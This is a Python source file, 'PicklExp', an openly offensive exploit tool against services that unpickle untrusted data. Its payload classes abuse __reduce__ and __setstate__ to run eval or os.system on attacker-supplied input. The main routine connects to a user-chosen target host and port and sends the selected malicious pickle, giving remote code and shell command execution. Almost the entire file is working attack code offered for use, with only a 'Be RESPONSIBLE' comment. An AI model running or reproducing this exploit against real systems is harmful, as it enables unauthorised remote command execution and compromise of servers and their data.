#BSD 3-Clause, (C) Alfred Manville 2022
#Be RESPONSIBLE when using this!
import networker as net
import pickle
import sys
#import traceback

#Payloads:
#State payloads only work if the Object is available at the target

class ExpBase:
    def __init__(self, data):
        self.data = data

class StateBase(ExpBase):
    def __getstate__(self):
        return self.data

class StatePXP(StateBase):
    def __setstate__(self, state):
        self.data = state
        print(self.data)

class ReducePXP(ExpBase):
    def __reduce__(self):
        return print, (self.data,)

class StateEXP(StateBase):
    def __setstate__(self, state):
        self.data = state
        eval(self.data)

class ReduceEXP(ExpBase):
    def __reduce__(self):
        return eval, (self.data,)

class ReduceSXP(ExpBase):
    def __reduce__(self):
        import os
        return os.system, (self.data,)

def listAsTypes(lin):
    toret = "["
    for x in lin:
        toret += str(type(x)) + ", "
    toret = toret[:-2]
    return toret + "]"

payloads = (StatePXP(""), ReducePXP(""), StateEXP(""), ReduceEXP(""), ReduceSXP(""))
payload = None
taddr = ""
tport = 0
plid = 0
pldata = ""

def onx(a):
    pass

def ony(a, m):
    pass

def main():
    conn = net.Connection(None, net.PickleTranslate(), onx, ony, onx)
    print("Running Exploit @ " + taddr + ":" + str(tport))
    print("Exploit: " + str(type(payload)) + " ; Data: " + pldata)
    try:
        conn.connect((taddr, tport))
        print("Exploiting...")
        conn.send(taddr+":"+str(tport), payload)
        print("Exploited!")
    except:
        #print(traceback.format_exc())
        pass
    conn.close()
    exit

if __name__ == "__main__":
    print("Python PicklExp (C) Alfred Manville 2022 BSD-3-Clause")
    if len(sys.argv) > 1:
        taddr = sys.argv[1]
    else:
        taddr = input("Enter the target address: ")
    if len(sys.argv) > 2:
        tport = int(sys.argv[2])
    else:
        tport = int(input("Enter the target port: "))
    if len(sys.argv) > 3:
        plid = int(sys.argv[3]) - 1
    else:
        plid = int(input("Enter the payload position " + listAsTypes(payloads) + " : ")) - 1
    if len(sys.argv) > 4:
        pldata = sys.argv[4]
    else:
        pldata = input("Enter the payload data: ")
    payload = payloads[plid]
    payload.data = pldata
    main()
